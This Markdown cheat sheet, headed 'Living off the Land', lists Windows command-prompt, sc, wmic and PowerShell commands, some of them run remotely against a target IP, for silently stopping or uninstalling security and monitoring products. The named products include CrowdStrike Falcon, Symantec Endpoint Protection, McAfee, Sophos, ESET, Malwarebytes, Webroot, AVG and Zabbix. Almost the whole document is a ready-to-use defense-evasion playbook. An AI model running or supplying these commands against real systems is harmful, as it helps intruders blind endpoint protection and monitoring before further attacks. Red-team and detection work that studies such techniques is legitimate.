# Living off the Land

TODO: Convert command prompt to Powershell cmdlets

## 01 - Uninstall Third-Party Endpoints

### 1.1 - MalwareBytes

#### 1.1.1 - Command Prompt

```
C:\> cmd.exe /c "C:\Program Files\Malwarebytes\Anti-Malware\unins001.exe" /silent /noreboot
```

#### 1.1.2 - PowerShell

```
PS C:\> Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\unins001.exe" -NoNewWindow -ArgumentList ("/silent","/noreboot")
```

## 02 - Disable Third-Party Endpoints

### 2.1 - CrowdStrike

Command Prompt

```
C:\> net.exe stop "CrowdStrike Falcon Sensor Service"
```

Powershell

```
PS C:\> Get-Service [-ComputerName <IP>] -Name "CrowdStrike Falcon Sensor Service" | Stop-Service -Force

PS C:\> Stop-Service -InputObject $(Get-Service -ComputerName <IP> -Name "CrowdStrike Falcon Sensor Service")

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { Stop-Service -Force -Name "CrowdStrike Falcon Sensor Service" }

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { cmd.exe /c "net.exe stop \"CrowdStrike Falcon Sensor Service\"" }
```

### 2.2 - Symantec

Command Prompt

```
C:\> net.exe stop "Symantec Endpoint Protection"

C:\> sc.exe \\<IP> stop "Symantec Endpoint Protection"
```

Powershell

```
PS C:\> Get-Service [-ComputerName <IP>] -Name "Symantec Endpoint Protection" | Stop-Service -Force

PS C:\> Stop-Service -InputObject $(Get-Service -ComputerName <IP> -Name "Symantec Endpoint Protection")

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {Stop-Service -Force -Name "Symantec Endpoint Protection"}

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {cmd.exe /c "net.exe stop \"Symantec Endpoint Protection\""}
```

### 2.3 - Zabbix

Command Prompt

```
C:\> net.exe stop "Zabbix Agent"

C:\> sc.exe \\<IP> stop "Zabbix Agent"
```

Powershell

```
PS C:\> Get-Service [-ComputerName <IP>] -Name "Zabbix Agent" | Stop-Service -Force

PS C:\> Stop-Service -InputObject $(Get-Service -ComputerName <IP> -Name "Zabbix Agent")

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {cmd /c "net.exe stop \"Zabbix Agent\""}

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {Stop-Service -Force -Name "Zabbix Agent"}
```

## 03 - Uninstall Endpoints

### 3.1 - Syntax

#### 3.1.1 - Command Prompt

```
C:\> wmic product get name /value
```

> [!NOTE]
> Some AVs particular anti-malware that is installed in windows taken measures to prevent attackers to uninstall it. But not all of them. When uninstalling the software you must have **administrative privileges**.

```
C:\> wmic product where name="<software_name>" call uninstall /nointeractive
```

#### 3.1.2 - Powershell

Convert the commands to cmdlets

```
Get-WmiObject
Get-CimAssociatedInstance
Get-CimInstance
Get-CimClass
Get-CimSession
```

### 3.2 - ESET

#### 3.2.1 - Command Prompt

```
C:\> wmic product where name="ESET File Security" call uninstall /nointeractive
```

### 3.3 - McAfee

#### 3.3.1 - Command Prompt

```
C:\> wmic product where name="McAfee VirusScan Enterprise" call uninstall /nointeractive

wmic product where name="McAfee Agent" call uninstall /nointeractive

wmic product where name="McAfee DLP Endpoint" call uninstall /nointeractive

wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive

wmic product where name="McAfee Endpoint Security Threat Prevention" call uninstall /nointeractive

wmic product where name="McAfee SiteAdvisor Enterprise" call uninstall /nointeractive
```

### 3.4.1 - MalwareBytes

#### 3.4.1.1 - Command Prompt

```
C:\> wmic product where name="Malwarebytes Managed Client" call uninstall /nointeractive
```

### 3.5.1 - AVG

#### 3.5.1.1 - Command Prompt

```
C:\> wmic product where name="AVG 2015" call uninstall /nointeractive
```

### 3.6 - Webroot

#### 3.6.1 - Command Prompt

```
C:\> wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive
```

### 3.7 - Symantec

#### 3.7.1 - Command Prompt

```
C:\> wmic product where name="Symantec Endpoint Protection" call uninstall /nointeractive

wmic product where name="Symantec Backup Exec Remote Agent for Windows" call uninstall /nointeractive
```

### 3.8 - Sophos

#### 3.8.1 - Command Prompt

```
C:\> wmic product where name="Sophos System Protection" call uninstall /nointeractive

wmic product where name="Sophos AutoUpdate" call uninstall /nointeractive

wmic product where name="Sophos Remote Management System" call uninstall /nointeractive
```

---
## References

- [LOFLCAB: Win32_Product](https://lofl-project.github.io/loflcab/WMI/Win32_Product/)